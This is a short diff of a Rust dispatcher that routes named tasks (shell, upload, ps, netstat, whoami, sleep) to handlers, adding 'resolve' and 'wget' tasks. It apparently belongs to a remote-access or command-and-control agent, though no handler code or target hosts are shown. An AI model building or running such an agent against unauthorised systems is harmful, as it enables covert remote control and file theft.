@@ -18,6 +18,8 @@ mod mv;
 mod netstat;
 #[path = "tasks/ps.rs"]
 mod ps;
+#[path = "tasks/resolve.rs"]
+mod resolve;
 #[path = "tasks/rm.rs"]
 mod rm;
 #[path = "tasks/shell.rs"]
@@ -28,6 +30,8 @@ mod sleep;
 mod sysinfo;
 #[path = "tasks/upload.rs"]
 mod upload;
+#[path = "tasks/wget.rs"]
+mod wget;
 #[path = "tasks/whoami.rs"]
 mod whoami;
 
@@ -46,11 +50,13 @@ pub fn dispatch(task: &TaskMessage) -> TaskResponse {
         "mv" => mv::handle(task),
         "netstat" => netstat::handle(task),
         "ps" => ps::handle(task),
+        "resolve" => resolve::handle(task),
         "rm" => rm::handle(task),
         "shell" => shell::handle(task),
         "sleep" => sleep::handle(task),
         "sysinfo" => sysinfo::handle(task),
         "upload" => upload::handle(task),
+        "wget" => wget::handle(task),
         "whoami" => whoami::handle(task),
         unknown => TaskResponse::failed(task.id, &format!("unknown command: {unknown}")),
     }
